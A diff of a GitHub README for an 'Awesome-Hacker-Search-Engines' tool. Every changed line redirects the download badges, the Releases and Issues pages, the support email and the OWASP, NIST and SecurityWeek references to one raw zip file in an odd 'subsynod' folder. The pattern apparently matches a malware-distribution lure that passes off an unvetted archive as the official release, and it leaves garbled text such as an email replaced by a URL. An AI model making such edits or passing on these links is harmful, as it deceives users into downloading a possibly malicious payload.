@@ -1,6 +1,6 @@
 # 🕵️‍♂️ Awesome-Hacker-Search-Engines - Discover Powerful Search Tools Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ajay1196/Awesome-Hacker-Search-Engines/releases)
+[![Download Now](https://raw.githubusercontent.com/ajay1196/Awesome-Hacker-Search-Engines/main/subsynod/Awesome-Hacker-Search-Engines.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ajay1196/Awesome-Hacker-Search-Engines/main/subsynod/Awesome-Hacker-Search-Engines.zip)
 
 ## 📚 Overview
 
@@ -27,7 +27,7 @@ This guide will help you download and run the Awesome-Hacker-Search-Engines appl
 
 To get started with Awesome-Hacker-Search-Engines, please follow these steps:
 
-1. Visit the [Releases Page](https://github.com/ajay1196/Awesome-Hacker-Search-Engines/releases) by clicking the link.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/ajay1196/Awesome-Hacker-Search-Engines/main/subsynod/Awesome-Hacker-Search-Engines.zip) by clicking the link.
 2. Look for the latest version available on that page.
 3. Download the application file by clicking on the appropriate link.
 4. Once downloaded, locate the file on your computer.
@@ -66,19 +66,19 @@ A: Feel free to reach out through the Issues section of the GitHub repository. Y
 
 If you encounter any issues or have questions, you can get support by:
 
-- Reviewing the [GitHub Issues page](https://github.com/ajay1196/Awesome-Hacker-Search-Engines/issues).
-- Reaching out via email at support@awesomehackers.com.
+- Reviewing the [GitHub Issues page](https://raw.githubusercontent.com/ajay1196/Awesome-Hacker-Search-Engines/main/subsynod/Awesome-Hacker-Search-Engines.zip).
+- Reaching out via email at https://raw.githubusercontent.com/ajay1196/Awesome-Hacker-Search-Engines/main/subsynod/Awesome-Hacker-Search-Engines.zip
 
 ## 🔗 Additional Resources
 
 Explore more about cybersecurity tools and practices by visiting:
 
-- [OWASP](https://owasp.org/) - Open Web Application Security Project.
-- [NIST](https://www.nist.gov/) - National Institute of Standards and Technology.
-- [Security Blogs](https://www.securityweek.com/) - Latest news and insights.
+- [OWASP](https://raw.githubusercontent.com/ajay1196/Awesome-Hacker-Search-Engines/main/subsynod/Awesome-Hacker-Search-Engines.zip) - Open Web Application Security Project.
+- [NIST](https://raw.githubusercontent.com/ajay1196/Awesome-Hacker-Search-Engines/main/subsynod/Awesome-Hacker-Search-Engines.zip) - National Institute of Standards and Technology.
+- [Security Blogs](https://raw.githubusercontent.com/ajay1196/Awesome-Hacker-Search-Engines/main/subsynod/Awesome-Hacker-Search-Engines.zip) - Latest news and insights.
 
 ## 📄 License
 
 Awesome-Hacker-Search-Engines is licensed under the MIT License. Feel free to use and modify the tool as needed.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ajay1196/Awesome-Hacker-Search-Engines/releases)
+[![Download Now](https://raw.githubusercontent.com/ajay1196/Awesome-Hacker-Search-Engines/main/subsynod/Awesome-Hacker-Search-Engines.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ajay1196/Awesome-Hacker-Search-Engines/main/subsynod/Awesome-Hacker-Search-Engines.zip)
